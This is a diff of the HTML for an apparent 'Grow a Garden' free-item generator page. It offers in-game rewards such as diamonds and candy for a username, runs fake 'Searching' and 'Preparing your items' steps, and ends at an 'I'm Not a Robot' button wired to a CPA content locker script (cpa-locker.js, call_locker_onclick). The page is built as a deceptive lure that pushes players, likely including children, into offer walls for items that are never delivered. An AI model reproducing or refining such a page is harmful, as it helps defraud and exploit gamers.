@@ -15,53 +15,15 @@
     <meta property="og:type" content="website">
     
     <link rel="shortcut icon" href="assets/images/Site-favicon.webp">
-  
     <link rel="stylesheet" href="assets/css/index.css?v=1.0.1">
-
-    <style>
-        /* Load fonts locally instead of Google CDN. WOFF2 format optimized for fast loading */
-        @font-face {
-            font-family: 'Bungee';
-            src: url('assets/fonts/bungee/N0bU2SZBIuF2PU_0DXR1C9zfmQ.woff2') format('woff2');
-            font-weight: normal;
-            font-style: normal;
-            font-display: swap;
-        }
-
-        @font-face {
-            font-family: 'Luckiest Guy';
-            src: url('assets/fonts/luckiestguy/_gP_1RrxsjcxVyin9l9n_j2hTd52ijl7aQ.woff2') format('woff2');
-            font-weight: normal;
-            font-style: normal;
-            font-display: swap;
-        }
-
-        @font-face {
-            font-family: 'Kalam';
-            src: url('assets/fonts/kalam/YA9Qr0Wd4kDdMtDqHTLMkiQqtbGs.woff2') format('woff2');
-            font-weight: 700;
-            font-style: normal;
-            font-display: swap;
-        }
-
-        /* Hide the Claim action when max choices are reached */
-        #gallery.max-reached .img-container:not(.selected) {
-            filter: grayscale(100%) !important; 
-            opacity: 1 !important;              
-            pointer-events: none !important;    
-            cursor: not-allowed !important;
-        }
-
-        /* Completely hide the Claim button for unselected items when max elements are reached */
-        #gallery.max-reached .img-container:not(.selected) .claim-btn {
-            display: none !important;
-        }
-    </style>
 </head>
 <body class="pl-lock">
 
     <img src="assets/images/logo_19_11zon.webp" alt="Grow a Garden Logo" class="logo" width="150" height="150">
-    <div class="title-bar"><h1>Pick 3 Rewards – Instant Delivery!</h1></div>
+    
+    <div class="title-bar">
+        <h1>Pick 3 Rewards – Instant Delivery!</h1>
+    </div>
   
     <section class="selection-area" aria-labelledby="pick3-title">
         <h2 id="pick3-title" class="visually-hidden">Select up to three items and send</h2>
@@ -72,27 +34,20 @@
             <div class="slot" id="slot3" aria-label="Selected item slot 3"></div>
         </div>
   
-        <form class="controls" id="send-form" hidden>
-            <label for="username" class="visually-hidden">username</label>
-            <input type="text" id="username" name="username" placeholder="Enter your username" autocomplete="username" required>
-            <button type="submit" id="send-btn">Send</button>
-        </form>
-  
         <div class="controls" id="continue-placeholder">
-            <button type="button" id="continue-btn" style="display: none;" hidden>Continue</button>
+            <button type="button" id="continue-btn" style="display: none;">Continue</button>
         </div>
   
-        <div class="progress-container" id="progress-container" aria-hidden="true" hidden>
+        <div class="progress-container" id="progress-container" aria-hidden="true" style="display: none;">
             <div class="progress-bar" id="progress-bar"></div>
         </div>
   
-        <div class="confirmation" id="confirmation" role="status" aria-live="polite" aria-hidden="true" hidden></div>
+        <div class="confirmation" id="confirmation" role="status" aria-live="polite" aria-hidden="true" style="display: none;"></div>
     </section>
   
     <section id="gallery" aria-labelledby="gallery-title">
         <h2 id="gallery-title" class="visually-hidden">Gallery of items</h2>
   
-        <!-- Row 1 -->
         <div class="row">
             <div class="img-container">
                 <img src="assets/images/10k-diamond_1_11zon.webp" class="pet" data-used="false" tabindex="0" alt="10k Diamond" loading="lazy" width="140" height="140">
@@ -116,7 +71,6 @@
             </div>
         </div>
       
-        <!-- Row 2 -->
         <div class="row">
             <div class="img-container">
                 <img src="assets/images/5000candy_3_11zon.webp" class="pet" data-used="false" tabindex="0" alt="5000 Candy" loading="lazy" width="140" height="140">
@@ -140,7 +94,6 @@
             </div>
         </div>
 
-        <!-- Row 3 -->
         <div class="row">
             <div class="img-container">
                 <img src="assets/images/Assassinclass_6_11zon.webp" class="pet" data-used="false" tabindex="0" alt="Assassin Class" loading="lazy" width="140" height="140">
@@ -164,7 +117,6 @@
             </div>
         </div>
 
-        <!-- Row 4 -->
         <div class="row">
             <div class="img-container">
                 <img src="assets/images/Pumpkin_23_11zon.webp" class="pet" data-used="false" tabindex="0" alt="Pumpkin" loading="lazy" width="140" height="140">
@@ -188,7 +140,6 @@
             </div>
         </div>
       
-        <!-- Row 5 -->
         <div class="row">
             <div class="img-container">
                 <img src="assets/images/Trident-New_29_11zon.webp" class="pet" data-used="false" tabindex="0" alt="Trident New" loading="lazy" width="140" height="140">
@@ -212,7 +163,6 @@
             </div>
         </div>  
       
-        <!-- Row 6 -->
         <div class="row">
             <div class="img-container">
                 <img src="assets/images/Oil-barrel_20_11zon.webp" class="pet" data-used="false" tabindex="0" alt="Oil barrel" loading="lazy" width="140" height="140">
@@ -232,7 +182,7 @@
     <div class="purchase-popup" id="purchase-popup" aria-modal="true" role="dialog" aria-hidden="true" style="display: none;">
         <div class="popup-content" role="document">
             <div class="popup-header">
-                <h3 id="popup-title">REWARD UNLOCKED</h3>
+                <h3 id="popup-title">REWARDS SELECTED</h3>
             </div>
   
             <div id="popup-step-input" class="popup-step">
@@ -240,7 +190,7 @@
             
                 <div class="input-group">
                     <input type="text" id="popup-username" placeholder="Enter your username" autocomplete="username">
-                    <div class="user-error" id="popup-user-error" hidden style="display: none;">Please enter your username</div>
+                    <div class="user-error" id="popup-user-error" style="display: none;">Please enter your username</div>
                 </div>
             
                 <div class="popup-buttons">
@@ -249,14 +199,18 @@
                 </div>
             </div>
   
-            <div id="popup-step-search" class="popup-step" hidden>
+            <div id="popup-step-search" class="popup-step" style="display: none;">
                 <div class="folding" id="search-spinner">
-                    <div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div>
+                    <div class="sk-cube1 sk-cube"></div>
+                    <div class="sk-cube2 sk-cube"></div>
+                    <div class="sk-cube4 sk-cube"></div>
+                    <div class="sk-cube3 sk-cube"></div>
+                    <div class="square"></div>
                 </div>
                 <p class="searching-text" id="searching-text">Searching...</p>
             </div>
   
-            <div id="popup-step-success" class="popup-step" hidden>
+            <div id="popup-step-success" class="popup-step" style="display: none;">
                 <img src="" id="popup-avatar" class="result-avatar" alt="avatar" loading="lazy" width="80" height="80">
                 <p class="result-username" id="popup-username-label"></p>
                 <div style="display:flex; gap:10px; width:95%; justify-content:center;">
@@ -265,13 +219,17 @@
                 </div>
             </div>
           
-            <div id="popup-step-verify" class="popup-step" hidden>
+            <div id="popup-step-verify" class="popup-step" style="display: none;">
                 <h3 class="popup-subtitle" id="verify-title"></h3>
                 <div class="folding" id="verify-spinner">
-                    <div class="sk-cube1 sk-cube"></div><div class="sk-cube2 sk-cube"></div><div class="sk-cube4 sk-cube"></div><div class="sk-cube3 sk-cube"></div><div class="square"></div>
+                    <div class="sk-cube1 sk-cube"></div>
+                    <div class="sk-cube2 sk-cube"></div>
+                    <div class="sk-cube4 sk-cube"></div>
+                    <div class="sk-cube3 sk-cube"></div>
+                    <div class="square"></div>
                 </div>
                 <p class="searching-text" id="verify-text">Preparing your items...</p>
-                <div class="cta" id="post-cta-inline" hidden style="display: none;">
+                <div class="cta" id="post-cta-inline" style="display: none;">
                     <button type="button" class="btn-accept" id="cta-accept-inline" aria-label="Verify: I'm Not a Robot" onclick="if(typeof _JW === 'function'){ _JW(); }else{ call_locker_onclick(); }">I'm Not a Robot</button>
                 </div>
             </div>
@@ -291,18 +249,10 @@
         </div>
     </div>
   
-    <audio id="clickSound" preload="auto">
-        <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="dingSound" preload="auto">
-        <source src="media/audio_2f2b87b7a9.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="successSound" preload="auto">
-        <source src="media/audio_582a9c9e72.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="verifySound" preload="auto">
-        <source src="media/audio_6130b029fd.mp3" type="audio/mpeg">
-    </audio>
+    <audio id="clickSound" src="media/audio_63c49c13c8.mp3" preload="auto" playsinline></audio>
+    <audio id="dingSound" src="media/audio_2f2b87b7a9.mp3" preload="auto" playsinline></audio>
+    <audio id="successSound" src="media/audio_582a9c9e72.mp3" preload="auto" playsinline></audio>
+    <audio id="verifySound" src="media/audio_6130b029fd.mp3" preload="auto" playsinline></audio>
 
     <script src="assets/js/main.js?v=1.0.1"></script>
     <script src="assets/js/cpa-locker.js?v=1.0.1"></script>
